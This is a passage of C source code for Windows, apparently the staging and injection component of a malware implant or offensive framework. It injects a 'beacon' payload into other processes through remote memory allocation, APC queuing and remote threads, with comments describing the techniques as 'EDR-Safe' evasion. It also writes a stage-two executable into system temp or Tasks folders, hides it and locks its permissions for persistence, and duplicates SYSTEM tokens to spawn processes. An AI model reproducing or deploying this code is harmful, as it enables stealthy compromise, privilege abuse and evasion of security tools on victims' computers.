    HANDLE hProcess = OpenProcess(dwProcessAccess, FALSE, targetPID);
    
    if (!hProcess) {
        LOGE("[-] Failed to open target process (PID %d) (%lu)\n", targetPID, GetLastError());
        return FALSE;
    }
    
    // EDR-Safe: Allocate RW (not RWX) to avoid detection
    PVOID pRemoteBase = VirtualAllocEx(hProcess, NULL, dwBeaconSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    
    if (!pRemoteBase) {
        LOGE("[-] VirtualAllocEx failed (%lu)\n", GetLastError());
        CloseHandle(hProcess);
        return FALSE;
    }
    
    // Write beacon
    SIZE_T written = 0;
    if (!WriteProcessMemory(hProcess, pRemoteBase, pBeacon, dwBeaconSize, &written)) {
        LOGE("[-] WriteProcessMemory failed (%lu)\n", GetLastError());
        VirtualFreeEx(hProcess, pRemoteBase, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }
    
    // EDR-Safe: Change to RX after write (mimics legitimate code loading)
    DWORD dwOldProtect;
    VirtualProtectEx(hProcess, pRemoteBase, dwBeaconSize, PAGE_EXECUTE_READ, &dwOldProtect);
    
    // Get main thread for APC injection
    HANDLE hThread = GetMainThread(targetPID);
    if (!hThread) {
        LOGE("[-] Failed to get main thread for PID %d (%lu)\n", targetPID, GetLastError());
        VirtualFreeEx(hProcess, pRemoteBase, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }
    
    // QueueUserAPC as best-effort (not reliable for PE payloads)
    if (QueueUserAPC((PAPCFUNC)pRemoteBase, hThread, 0)) {
        LOGV("[*] APC queued into PID %d (non-guaranteed execution for PE payloads)\n", targetPID);
    } else {
        LOGV("[-] QueueUserAPC failed (%lu)\n", GetLastError());
    }
    
    // Fallback: Create remote thread
    HANDLE hRemoteThread = CreateRemoteThread(hProcess, NULL, 0,
        (LPTHREAD_START_ROUTINE)pRemoteBase, NULL, 0, NULL);
    
    if (hRemoteThread) {
        LOGV("[+] Beacon injected via thread into PID %d\n", targetPID);
        gBeaconImplantPid = targetPID;
        CloseHandle(hRemoteThread);
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return TRUE;
    }
    
    LOGE("[-] CreateRemoteThread failed (%lu)\n", GetLastError());
    VirtualFreeEx(hProcess, pRemoteBase, 0, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProcess);
    return FALSE;
}

// ============================================================================
// FALLBACK: spawn stage2 as standalone process
// ============================================================================

static BOOL EnsureDirectoryTreeExists(LPCSTR lpPath) {
    char walkPath[MAX_PATH] = { 0 };
    if (!lpPath || !*lpPath) {
        return FALSE;
    }

    if (_snprintf(walkPath, MAX_PATH, "%s", lpPath) < 0) {
        return FALSE;
    }

    size_t pathLen = strlen(walkPath);
    if (!pathLen || pathLen >= MAX_PATH - 1) {
        return FALSE;
    }

    for (size_t i = 3; i < pathLen; i++) {
        if (walkPath[i] != '\\' && walkPath[i] != '/') {
            continue;
        }

        char saved = walkPath[i];
        walkPath[i] = '\0';
        if (GetFileAttributesA(walkPath) == INVALID_FILE_ATTRIBUTES) {
            if (!CreateDirectoryA(walkPath, NULL) && GetLastError() != ERROR_ALREADY_EXISTS) {
                LOGV("[-] CreateDirectoryA failed for %s (%lu)\n", walkPath, GetLastError());
                return FALSE;
            }
        }
        walkPath[i] = saved;
    }

    if (GetFileAttributesA(walkPath) == INVALID_FILE_ATTRIBUTES) {
        if (!CreateDirectoryA(walkPath, NULL) && GetLastError() != ERROR_ALREADY_EXISTS) {
            LOGV("[-] CreateDirectoryA failed for %s (%lu)\n", walkPath, GetLastError());
            return FALSE;
        }
    }

    DWORD attrs = GetFileAttributesA(walkPath);
    if (attrs == INVALID_FILE_ATTRIBUTES) {
        LOGV("[-] Final directory check failed for %s (%lu)\n", walkPath, GetLastError());
        return FALSE;
    }

    if (!(attrs & FILE_ATTRIBUTE_DIRECTORY)) {
        LOGV("[-] Final path exists but is not a directory: %s (%lu)\n", walkPath, GetLastError());
        return FALSE;
    }

    return (attrs & FILE_ATTRIBUTE_DIRECTORY) != 0;
}

static BOOL ApplyProtectedFilesystemAcl(LPCSTR lpPath, LPCSTR lpSddl) {
    if (!lpPath || !*lpPath || !lpSddl || !*lpSddl) {
        return FALSE;
    }

    return ApplyProtectedFilesystemAclWithFallback(lpPath, lpSddl, STAGE_SYSTEM_STAGER_RUNTIME_SDDL_PROTECT_ALT);
}

static BOOL ApplyProtectedFilesystemAclWithFallback(LPCSTR lpPath, LPCSTR lpPrimarySddl, LPCSTR lpFallbackSddl) {
    if (!lpPath || !*lpPath || !lpPrimarySddl || !*lpPrimarySddl) {
        return FALSE;
    }

    DWORD dwFileAttrs = GetFileAttributesA(lpPath);
    if (dwFileAttrs == INVALID_FILE_ATTRIBUTES) {
        return FALSE;
    }

    const char* lpCandidates[3] = { lpPrimarySddl, lpFallbackSddl, NULL };

    for (int i = 0; i < 3; ++i) {
        const char* lpCandidate = lpCandidates[i];
        if (!lpCandidate) {
            return FALSE;
        }

        PSECURITY_DESCRIPTOR pSecurityDescriptor = NULL;
        if (!ConvertStringSecurityDescriptorToSecurityDescriptorA(
                lpCandidate,
                SDDL_REVISION_1,
                &pSecurityDescriptor,
                NULL
            )) {
            LOGV(
                "[-] ConvertStringSecurityDescriptorToSecurityDescriptorA failed for filesystem candidate %d (%lu)\n",
                i,
                GetLastError()
            );
            continue;
        }

        BOOL bApplied = SetFileSecurityA(lpPath, DACL_SECURITY_INFORMATION, pSecurityDescriptor);
        DWORD dwErr = GetLastError();
        LocalFree(pSecurityDescriptor);
        if (bApplied) {
            return TRUE;
        }

        SetLastError(dwErr);
        LOGV("[-] SetFileSecurityA failed for filesystem candidate %d (%lu)\n", i, dwErr);
    }

    return FALSE;
}

static BOOL HardenPersistentStagerImage(LPCSTR lpRuntimePath) {
    if (!lpRuntimePath || !*lpRuntimePath) {
        return FALSE;
    }

    BOOL bAcl = ApplyProtectedFilesystemAcl(lpRuntimePath, STAGE_SYSTEM_STAGER_RUNTIME_SDDL_PROTECT);
    if (!bAcl) {
        LOGV("[-] Failed to apply protected ACL to %s (%lu)\n", lpRuntimePath, GetLastError());
    } else {
        LOGV("[+] Applied protected ACL to persistent stager image %s\n", lpRuntimePath);
    }

    DWORD attrs = GetFileAttributesA(lpRuntimePath);
    if (attrs != INVALID_FILE_ATTRIBUTES) {
        DWORD hardenedAttrs = attrs | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN;
        if (!SetFileAttributesA(lpRuntimePath, hardenedAttrs)) {
            LOGV("[-] Failed to set FILE_ATTRIBUTE_SYSTEM/HIDDEN on %s (%lu)\n", lpRuntimePath, GetLastError());
        }
    }

    return bAcl;
}

static BOOL TrySetSystemStagerDirectory(LPSTR lpPath, DWORD cbPath, LPCSTR lpTemplate) {
    char expandedTemplate[MAX_PATH] = { 0 };
    char fullPath[MAX_PATH] = { 0 };
    if (!lpPath || cbPath < 2 || !lpTemplate || !*lpTemplate) {
        return FALSE;
    }

    DWORD envLen = ExpandEnvironmentStringsA(lpTemplate, expandedTemplate, MAX_PATH);
    if (envLen == 0) {
        if (_snprintf(expandedTemplate, MAX_PATH, "%s", lpTemplate) < 0) {
            return FALSE;
        }
    } else if (envLen >= MAX_PATH) {
        LOGV("[-] Expanded staging template too long: %s\n", lpTemplate);
        return FALSE;
    }

    DWORD fullLen = GetFullPathNameA(expandedTemplate, cbPath, fullPath, NULL);
    if (fullLen == 0 || fullLen >= cbPath) {
        LOGV("[-] Failed to resolve staging path from template %s (%lu)\n", lpTemplate, GetLastError());
        return FALSE;
    }

    if (_snprintf(lpPath, cbPath, "%s", fullPath) < 0) {
        return FALSE;
    }

    if (!EnsureDirectoryTreeExists(lpPath)) {
        LOGV("[-] Failed to create staging path tree %s (%lu)\n", lpPath, GetLastError());
        return FALSE;
    }

    if (!CreateDirectoryA(lpPath, NULL) && GetLastError() != ERROR_ALREADY_EXISTS) {
        LOGV("[-] Failed to create staging path %s (%lu)\n", lpPath, GetLastError());
        return FALSE;
    }

    char probePath[MAX_PATH] = { 0 };
    if (_snprintf(probePath, MAX_PATH, "%s\\slv%lu%lu.tmp", lpPath, GetCurrentProcessId(), GetTickCount()) < 0) {
        return FALSE;
    }

    HANDLE hProbe = CreateFileA(
        probePath,
        GENERIC_WRITE,
        0,
        NULL,
        CREATE_NEW,
        FILE_ATTRIBUTE_TEMPORARY,
        NULL
    );
    if (hProbe == INVALID_HANDLE_VALUE) {
        LOGV("[-] Failed to probe staging path write access %s (%lu)\n", lpPath, GetLastError());
        return FALSE;
    }

    CloseHandle(hProbe);
    DeleteFileA(probePath);

    LOGV("[*] Using SYSTEM staging directory %s\n", lpPath);
    return TRUE;
}

static BOOL GetSystemStagerDirectory(LPSTR lpPath, DWORD cbPath) {
    if (!lpPath || !cbPath) {
        return FALSE;
    }

    const BOOL bUseAggressiveCandidates = STAGE_ALLOW_DISK_STAGED_EXECUTION && !STAGE_SYSTEM_STRICT;

    const char* lpCandidates[] = {
        "%TEMP%\\" STAGE2_SYSTEM_STAGING_SUBDIR,
        "%TMP%\\" STAGE2_SYSTEM_STAGING_SUBDIR
    };

    if (bUseAggressiveCandidates) {
        const char* lpAggressiveCandidates[] = {
            "%WINDIR%\\Temp\\" STAGE2_SYSTEM_STAGING_SUBDIR,
            "%SystemRoot%\\System32\\config\\systemprofile\\AppData\\Local\\Temp\\" STAGE2_SYSTEM_STAGING_SUBDIR,
            "%SystemRoot%\\System32\\Tasks\\" STAGE2_SYSTEM_STAGING_SUBDIR,
            "%SYSTEMDRIVE%\\Windows\\Temp\\" STAGE2_SYSTEM_STAGING_SUBDIR
        };

        for (int i = 0; i < STAGE_ARRAY_COUNT(lpAggressiveCandidates); i++) {
            if (TrySetSystemStagerDirectory(lpPath, cbPath, lpAggressiveCandidates[i])) {
                return TRUE;
            }
        }
    } else {
        LOGV("[*] Strict SYSTEM staging policy active; using user temp staging candidates only.\n");
    }

    for (int i = 0; i < STAGE_ARRAY_COUNT(lpCandidates); i++) {
        if (TrySetSystemStagerDirectory(lpPath, cbPath, lpCandidates[i])) {
            return TRUE;
        }
    }

    LOGV("[-] All managed system staging directory candidates failed\n");
    return FALSE;
}

static BOOL WriteStage2TempExecutableInDirectory(PBYTE pBeacon, DWORD dwBeaconSize,
                                               LPCSTR lpDirectory, LPSTR lpTempExePath) {
    if (!lpDirectory || !*lpDirectory || !lpTempExePath) {
        return FALSE;
    }

    char tempDir[MAX_PATH];
    char tempPath[MAX_PATH];
    HANDLE hFile = INVALID_HANDLE_VALUE;
    DWORD dwBytesWritten = 0;

    if (!pBeacon || !dwBeaconSize || !lpTempExePath) {
        return FALSE;
    }

    size_t dirLen = strlen(lpDirectory);
    if (!dirLen || dirLen >= MAX_PATH) {
        return FALSE;
    }
    _snprintf(tempDir, MAX_PATH, "%s", lpDirectory);

    if (!GetTempFileNameA(tempDir, "stg", 0, tempPath)) {
        LOGV("[-] GetTempFileNameA failed in %s (%lu)\n", tempDir, GetLastError());
        return FALSE;
    }

    if (_snprintf(lpTempExePath, MAX_PATH, "%s.exe", tempPath) < 0) {
        LOGV("[-] Failed to build stage filename %s\n", tempPath);
        DeleteFileA(tempPath);
        return FALSE;
    }

    if (!MoveFileA(tempPath, lpTempExePath)) {
        LOGV("[-] Failed to rename staged temp from %s to %s (%lu)\n", tempPath, lpTempExePath, GetLastError());
        return FALSE;
    }

    hFile = CreateFileA(lpTempExePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        LOGV("[-] Failed to open staged payload file %s (%lu)\n", lpTempExePath, GetLastError());
        DeleteFileA(lpTempExePath);
        return FALSE;
    }

    if (!WriteFile(hFile, pBeacon, dwBeaconSize, &dwBytesWritten, NULL) || dwBytesWritten != dwBeaconSize) {
        CloseHandle(hFile);
        LOGV("[-] Failed writing staged payload (%lu bytes written, expected %lu, err=%lu)\n",
            dwBytesWritten, dwBeaconSize, GetLastError());
        DeleteFileA(lpTempExePath);
        return FALSE;
    }

    CloseHandle(hFile);
    LOGV("[*] Wrote system payload stage to %s (%lu bytes)\n", lpTempExePath, dwBeaconSize);
    return TRUE;
}

static BOOL WriteStage2TempExecutable(PBYTE pBeacon, DWORD dwBeaconSize, LPSTR lpTempExePath) {
    char tempDir[MAX_PATH] = { 0 };
    if (!GetTempPathA(MAX_PATH, tempDir)) {
        return FALSE;
    }
    return WriteStage2TempExecutableInDirectory(pBeacon, dwBeaconSize, tempDir, lpTempExePath);
}

static BOOL WriteStage2SystemTempExecutable(PBYTE pBeacon, DWORD dwBeaconSize, LPSTR lpTempExePath) {
    char stageDir[MAX_PATH] = { 0 };
    char systemRoot[MAX_PATH] = { 0 };

    if (!GetSystemStagerDirectory(stageDir, MAX_PATH)) {
        LOGV("[-] SYSTEM staging directory discovery failed. Falling back to controlled fallback path.\n");
        if (!GetWindowsDirectoryA(systemRoot, MAX_PATH) || systemRoot[0] == '\0') {
            if (!GetEnvironmentVariableA("SystemRoot", systemRoot, MAX_PATH) || systemRoot[0] == '\0') {
                if (STAGE_SYSTEM_STRICT) {
                    return FALSE;
                }
                if (!GetTempPathA(MAX_PATH, systemRoot) || systemRoot[0] == '\0') {
                    return FALSE;
                }
            }
        }
        if (_snprintf(stageDir, MAX_PATH, "%s\\Temp\\%s", systemRoot, STAGE2_SYSTEM_STAGING_SUBDIR) < 0) {
            return FALSE;
        }
        if (!TrySetSystemStagerDirectory(stageDir, MAX_PATH, stageDir)) {
            LOGV("[-] Fallback system temp directory creation failed.");
            if (STAGE_SYSTEM_STRICT) {
                return FALSE;
            }
            if (!GetEnvironmentVariableA("TEMP", stageDir, MAX_PATH) || stageDir[0] == '\0') {
                if (!GetTempPathA(MAX_PATH, stageDir) || stageDir[0] == '\0') {
                    return FALSE;
                }
            }
            LOGV("[*] Using fallback temp staging directory %s\n", stageDir);
        }
    }

    if (strstr(stageDir, "%") != NULL) {
        char expanded[MAX_PATH] = { 0 };
        if (ExpandEnvironmentStringsA(stageDir, expanded, MAX_PATH) == 0 || expanded[0] == '\0') {
            return FALSE;
        }
        _snprintf(stageDir, MAX_PATH, "%s", expanded);
    }
    return WriteStage2TempExecutableInDirectory(pBeacon, dwBeaconSize, stageDir, lpTempExePath);
}

static BOOL BuildCommandLauncher(
    LPCSTR lpPayloadPath,
    LPSTR lpCmdPath,
    SIZE_T cbCmdPath,
    LPSTR lpCmdArgs,
    SIZE_T cbCmdArgs
) {
    if (!lpPayloadPath || !*lpPayloadPath || !lpCmdPath || cbCmdPath == 0) {
        return FALSE;
    }

    char systemRoot[MAX_PATH];
    if (!GetEnvironmentVariableA("WINDIR", systemRoot, MAX_PATH) || systemRoot[0] == '\0') {
        if (!GetEnvironmentVariableA("SystemRoot", systemRoot, MAX_PATH) || systemRoot[0] == '\0') {
            if (!GetWindowsDirectoryA(systemRoot, MAX_PATH) || systemRoot[0] == '\0') {
                return FALSE;
            }
        }
    }

    if (_snprintf(lpCmdPath, cbCmdPath, "%s\\System32\\cmd.exe", systemRoot) < 0) {
        return FALSE;
    }

    if (!lpCmdArgs || cbCmdArgs == 0) {
        return TRUE;
    }

    if (_snprintf(lpCmdArgs, cbCmdArgs, "/C \"%s\"", lpPayloadPath) < 0) {
        return FALSE;
    }

    return TRUE;
}

static BOOL BuildQuotedCommandLine(
    LPCSTR lpPayloadPath,
    LPSTR lpCommandLine,
    SIZE_T cbCommandLine
) {
    if (!lpPayloadPath || !*lpPayloadPath || !lpCommandLine || cbCommandLine == 0) {
        return FALSE;
    }

    return _snprintf(lpCommandLine, cbCommandLine, "\"%s\"", lpPayloadPath) >= 0;
}

static BOOL LaunchStage2Process(PBYTE pBeacon, DWORD dwBeaconSize) {
    char tempExePath[MAX_PATH] = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    STARTUPINFOA si = { 0 };
    si.cb = sizeof(si);

    char cmdLine[MAX_PATH * 2] = { 0 };
    if (!WriteStage2TempExecutable(pBeacon, dwBeaconSize, tempExePath)) {
        return FALSE;
    }

    snprintf(cmdLine, sizeof(cmdLine), "\"%s\"", tempExePath);

    if (!CreateProcessA(NULL, cmdLine, NULL, NULL, FALSE, DETACHED_PROCESS | CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        DWORD err = GetLastError();
        LOGV("[-] Stage2 process launch failed (%lu)\n", err);
        DeleteFileA(tempExePath);
        return FALSE;
    }

    DWORD dwProcessId = GetProcessId(pi.hProcess);
    LOGV("[+] Stage2 process launched in current user context (PID %lu)\n", dwProcessId);

    BOOL bRunning = ValidateChildProcessStartup(pi.hProcess, STAGE2_STARTUP_TIMEOUT_MS);
    if (!bRunning) {
        LOGV("[-] Stage2 process exited before initialization completed\n");
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        DeleteFileA(tempExePath);
        return FALSE;
    }

    gBeaconImplantPid = dwProcessId;

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    DeleteFileA(tempExePath);
    return TRUE;
}

static BOOL LaunchStage2ProcessWithToken(HANDLE hToken, PBYTE pBeacon, DWORD dwBeaconSize) {
    return RunStage2AsSystem(hToken, pBeacon, dwBeaconSize);
}

static BOOL ValidateChildProcessStartup(HANDLE hProcess, DWORD dwStartupMs) {
    if (!hProcess) {
        LOGE("[-] ValidateChildProcessStartup called with NULL handle.\n");
        return FALSE;
    }

    DWORD status = WaitForSingleObject(hProcess, dwStartupMs);
    if (status == WAIT_TIMEOUT) {
        if (STAGE2_POSTSTART_STABILITY_MS > 0) {
            Sleep(STAGE2_POSTSTART_STABILITY_MS);
        }
        DWORD dwExitCode = 0;
        if (!GetExitCodeProcess(hProcess, &dwExitCode)) {
            LOGE("[-] GetExitCodeProcess failed while validating stage2 child during post-start stability window (%lu)\n", GetLastError());
            return FALSE;
        }

        if (dwExitCode != STILL_ACTIVE) {
            LOGE("[-] Stage2 child exited during post-start stability window (exit 0x%08lX)\n", dwExitCode);
            return FALSE;
        }

        return TRUE;
    }

    if (status == WAIT_OBJECT_0) {
        DWORD dwExitCode = 0;
        if (!GetExitCodeProcess(hProcess, &dwExitCode)) {
            LOGE("[-] GetExitCodeProcess failed while validating stage2 child (%lu)\n", GetLastError());
            return FALSE;
        }

        if (dwExitCode == STILL_ACTIVE) {
            return TRUE;
        }

        LOGE("[-] Stage2 child process terminated before handshake window (exit 0x%08lX)\n", dwExitCode);
        return FALSE;
    }

    LOGE("[-] Stage2 child wait failed while validating startup window (%lu)\n", GetLastError());
    return FALSE;
}

static BOOL ValidateInjectedThreadStartup(HANDLE hThread, DWORD dwStartupMs) {
    if (!hThread) {
        return FALSE;
    }

    DWORD status = WaitForSingleObject(hThread, dwStartupMs);
    if (status == WAIT_TIMEOUT) {
        return TRUE;
    }

    if (status == WAIT_OBJECT_0) {
        DWORD dwExitCode = 0;
        if (!GetExitCodeThread(hThread, &dwExitCode)) {
            LOGE("[-] GetExitCodeThread failed while validating SYSTEM memory injection thread (%lu)\n", GetLastError());
            return FALSE;
        }
        LOGE("[-] SYSTEM memory injection thread exited before startup window (exit 0x%08lX)\n", dwExitCode);
        return FALSE;
    }

    LOGE("[-] SYSTEM memory injection thread wait failed while validating startup window (%lu)\n", GetLastError());
    return FALSE;
}

static BOOL ValidateSystemProcessStartup(HANDLE hProcess, DWORD dwPid, DWORD dwStartupMs) {
    if (!hProcess) {
        return FALSE;
    }

    DWORD verifyErr = ERROR_SUCCESS;
    if (!IsProcessTokenSystem(hProcess, dwPid, &verifyErr)) {
        LOGE("[-] Process validation rejected PID %lu (verify err=%lu)\n", dwPid, verifyErr);
        return FALSE;
    }

    return ValidateChildProcessStartup(hProcess, dwStartupMs);
}

static BOOL DuplicateTokenForPrimaryCreation(HANDLE hSystemToken, HANDLE* phPrimaryToken) {
    if (!hSystemToken || !phPrimaryToken) {
        return FALSE;
    }

    *phPrimaryToken = NULL;
    if (DuplicateTokenEx(
            hSystemToken,
            TOKEN_ALL_ACCESS,
            NULL,
            SecurityDelegation,
            TokenPrimary,
            phPrimaryToken)) {
        return TRUE;
    }

    LOGE("[-] DuplicateTokenForPrimaryCreation failed with TOKEN_ALL_ACCESS/Delegation (%lu)\n", GetLastError());

    if (DuplicateTokenEx(
            hSystemToken,
            MAXIMUM_ALLOWED,
            NULL,
            SecurityDelegation,
            TokenPrimary,
            phPrimaryToken)) {
        return TRUE;
    }

    LOGE("[-] DuplicateTokenForPrimaryCreation failed with MAXIMUM_ALLOWED/Delegation (%lu)\n", GetLastError());

    if (DuplicateTokenEx(
            hSystemToken,
            TOKEN_ALL_ACCESS,
            NULL,
            SecurityImpersonation,
            TokenPrimary,
            phPrimaryToken)) {
        return TRUE;
    }

    LOGE("[-] DuplicateTokenForPrimaryCreation failed with TOKEN_ALL_ACCESS/Impersonation (%lu)\n", GetLastError());

    if (DuplicateTokenEx(
            hSystemToken,
            TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY,
            NULL,
            SecurityImpersonation,
            TokenPrimary,
            phPrimaryToken)) {
        return TRUE;
    }

    LOGV("[-] DuplicateTokenForPrimaryCreation failed with TOKEN_DUPLICATE|TOKEN_ASSIGN_PRIMARY|TOKEN_QUERY/Impersonation (%lu)\n", GetLastError());

    LOGV("[-] DuplicateTokenEx(TokenPrimary) failed (%lu)\n", GetLastError());
    return FALSE;
}

static BOOL SpawnProcessWithPrimaryToken(
    HANDLE hPrimaryToken,
    LPCSTR lpApplicationPath,
    PHANDLE phProcess,
    PDWORD pdwPid
) {
    return SpawnProcessWithPrimaryTokenEx(
        hPrimaryToken,
        lpApplicationPath,
        phProcess,
        pdwPid,
        NULL,
        0
    );
}

static BOOL SpawnProcessWithPrimaryTokenEx(
    HANDLE hPrimaryToken,
    LPCSTR lpApplicationPath,
    PHANDLE phProcess,
    PDWORD pdwPid,
    PHANDLE phThread,
    DWORD dwExtraCreateFlags
) {
    if (!hPrimaryToken || !lpApplicationPath || !*lpApplicationPath || !phProcess || !pdwPid) {
        return FALSE;
    }

    if (phThread) {
        *phThread = NULL;
    }

    HANDLE hCreateToken = NULL;
    if (!DuplicateTokenForPrimaryCreation(hPrimaryToken, &hCreateToken)) {
        LOGE("[-] DuplicateTokenForPrimaryCreation failed for launch of %s\n", lpApplicationPath);
        return FALSE;
    }

    char cmdLine[MAX_PATH * 2] = { 0 };
    if (!BuildQuotedCommandLine(lpApplicationPath, cmdLine, sizeof(cmdLine))) {
        LOGE("[-] BuildQuotedCommandLine failed for %s\n", lpApplicationPath);
        CloseHandle(hCreateToken);
        return FALSE;
    }

    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    si.cb = sizeof(si);
    si.lpDesktop = "winsta0\\default";

    DWORD createFlags = CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP | CREATE_BREAKAWAY_FROM_JOB;
    if (dwExtraCreateFlags & CREATE_SUSPENDED) {
        createFlags |= CREATE_SUSPENDED;
    }
    createFlags |= dwExtraCreateFlags;
    LPCSTR lpSpawnMethod = "CreateProcessWithTokenW";

    BOOL bCreated = CreateProcessAsUserA(
        hCreateToken,
        NULL,
        cmdLine,
        NULL,
        NULL,
        FALSE,
        createFlags,
        NULL,
        NULL,
        &si,
        &pi
    );

    if (!bCreated) {
        DWORD createErr = GetLastError();
        LOGE("[-] CreateProcessAsUserA failed for %s (%lu), trying CreateProcessWithTokenW\n", lpApplicationPath, createErr);

        WCHAR wCommandLine[MAX_PATH * 2] = { 0 };
        int wideCmdLen = MultiByteToWideChar(CP_ACP, 0, cmdLine, -1, wCommandLine, MAX_PATH * 2);
        if (wideCmdLen == 0) {
            CloseHandle(hCreateToken);
            return FALSE;
        }

        STARTUPINFOW siW = { 0 };
        PROCESS_INFORMATION piW = { 0 };
        siW.cb = sizeof(siW);

        bCreated = CreateProcessWithTokenW(
            hCreateToken,
            LOGON_WITH_PROFILE,
            NULL,
            wCommandLine,
            createFlags,
            NULL,
            NULL,
            &siW,
            &piW
        );
        if (bCreated) {
            pi = piW;
            lpSpawnMethod = "CreateProcessWithTokenW";
        }
        if (!bCreated) {
            LOGE("[-] CreateProcessWithTokenW failed for %s (%lu)\n", lpApplicationPath, GetLastError());
            if (createErr == ERROR_PRIVILEGE_NOT_HELD || createErr == ERROR_ACCESS_DENIED) {
                DWORD fallbackFlags = createFlags & ~CREATE_NEW_PROCESS_GROUP;
                fallbackFlags &= ~CREATE_BREAKAWAY_FROM_JOB;

                bCreated = CreateProcessAsUserA(
                    hCreateToken,
                    NULL,
                    cmdLine,
                    NULL,
                    NULL,
                    FALSE,
                    fallbackFlags,
                    NULL,
                    NULL,
                    &si,
                    &pi
                );
                if (!bCreated) {
                    LOGE("[-] CreateProcessAsUserA fallback flags (%lu) failed for %s (%lu)\n",
                        fallbackFlags, lpApplicationPath, GetLastError());
                    LOGE("[-] Re-trying process creation with CreateProcessWithTokenW fallback flags (%lu)\n", fallbackFlags);
                    bCreated = CreateProcessWithTokenW(
                        hCreateToken,
                        LOGON_WITH_PROFILE,
                        NULL,
                        wCommandLine,
                        fallbackFlags,
                        NULL,
                        NULL,
                        &siW,
                        &piW
                    );
                    if (bCreated) {
                        pi = piW;
                        lpSpawnMethod = "CreateProcessWithTokenW (fallback)";
                    }
                } else {
                    LOGE("[*] Spawned process %s via CreateProcessAsUserA (fallback flags) (pid=%lu)\n", lpApplicationPath, pi.dwProcessId);
                    lpSpawnMethod = "CreateProcessAsUserA (fallback)";
                }
            }
        }
        if (!bCreated) {
            CloseHandle(hCreateToken);
            return FALSE;
        }

        LOGE("[*] Spawned process %s via %s (pid=%lu)\n", lpApplicationPath, lpSpawnMethod, pi.dwProcessId);
        CloseHandle(hCreateToken);
    } else {
        LOGE("[*] Spawned process %s via CreateProcessAsUserA (pid=%lu)\n", lpApplicationPath, pi.dwProcessId);
        CloseHandle(hCreateToken);
    }

    if (!bCreated) {
        return FALSE;
    }

    if (!pi.hProcess || pi.dwProcessId == 0) {
        if (pi.hThread) {
            CloseHandle(pi.hThread);
        }
        return FALSE;
    }

    *phProcess = pi.hProcess;
    *pdwPid = pi.dwProcessId;

    if (phThread) {
        *phThread = pi.hThread;
    } else {
        CloseHandle(pi.hThread);
    }

    return TRUE;
}

static BOOL DuplicateTokenForImpersonation(HANDLE hSystemToken, HANDLE* phImpersonationToken) {
    if (!hSystemToken || !phImpersonationToken) {
        return FALSE;
    }

    *phImpersonationToken = NULL;
    if (!DuplicateTokenEx(
            hSystemToken,
            TOKEN_ALL_ACCESS,
            NULL,
            SecurityDelegation,
            TokenImpersonation,
            phImpersonationToken)) {
        LOGE("[-] DuplicateTokenEx(SecurityDelegation, TokenImpersonation) failed (%lu), trying SecurityImpersonation fallback\n", GetLastError());
        if (!DuplicateTokenEx(
                hSystemToken,
                TOKEN_ALL_ACCESS,
                NULL,
                SecurityImpersonation,
                TokenImpersonation,
                phImpersonationToken)) {
            LOGE("[-] DuplicateTokenEx(TokenImpersonation) failed (%lu)\n", GetLastError());
            return FALSE;
        }
    }

    return TRUE;
}

static BOOL IsValidPePayload(PBYTE pBeacon, DWORD dwSize) {
    if (!pBeacon || dwSize < sizeof(IMAGE_DOS_HEADER)) {
        return FALSE;
    }

    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pBeacon;
    if (pDos->e_magic != IMAGE_DOS_SIGNATURE) {
        return FALSE;
    }

    DWORD e_lfanew = (DWORD)pDos->e_lfanew;
    if (e_lfanew < sizeof(IMAGE_DOS_HEADER) ||
        e_lfanew > dwSize - sizeof(DWORD)) {
        return FALSE;
    }

    if (e_lfanew > dwSize - sizeof(IMAGE_NT_HEADERS)) {
        return FALSE;
    }

    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pBeacon + e_lfanew);
    if (pNt->Signature != IMAGE_NT_SIGNATURE) {
        return FALSE;
    }

    if (pNt->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC &&
        pNt->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR32_MAGIC) {
        return FALSE;
    }

    if (pNt->FileHeader.NumberOfSections == 0) {
        return FALSE;
    }

    if (pNt->OptionalHeader.SizeOfImage == 0 || pNt->OptionalHeader.AddressOfEntryPoint == 0) {
        return FALSE;
    }

    return TRUE;
}

static BOOL WaitForSystemProcessStartByPathOrName(LPCSTR lpImagePath, DWORD dwTimeoutMs, PDWORD pdwPid) {
    if (!lpImagePath || !*lpImagePath) {
        return FALSE;
    }

    if (pdwPid) {
        *pdwPid = 0;
    }

    WCHAR targetFileW[MAX_PATH] = { 0 };
    WCHAR fullPathW[MAX_PATH] = { 0 };
    const char* pBase = strrchr(lpImagePath, '\\');
    const char* pSlashBase = strrchr(lpImagePath, '/');
    if (pSlashBase && (!pBase || pSlashBase > pBase)) {
        pBase = pSlashBase;
    }
    const BOOL bPathMode = (pBase != NULL) || strchr(lpImagePath, '/') || strchr(lpImagePath, ':');
    if (pBase) {
        MultiByteToWideChar(CP_ACP, 0, pBase + 1, -1, targetFileW, MAX_PATH);
        MultiByteToWideChar(CP_ACP, 0, lpImagePath, -1, fullPathW, MAX_PATH);
    } else {
        MultiByteToWideChar(CP_ACP, 0, lpImagePath, -1, targetFileW, MAX_PATH);
        MultiByteToWideChar(CP_ACP, 0, lpImagePath, -1, fullPathW, MAX_PATH);
    }

    FILETIME ftNow = { 0 };
    GetSystemTimeAsFileTime(&ftNow);
    ULONGLONG ullNow = ((ULONGLONG)ftNow.dwHighDateTime << 32) | ftNow.dwLowDateTime;
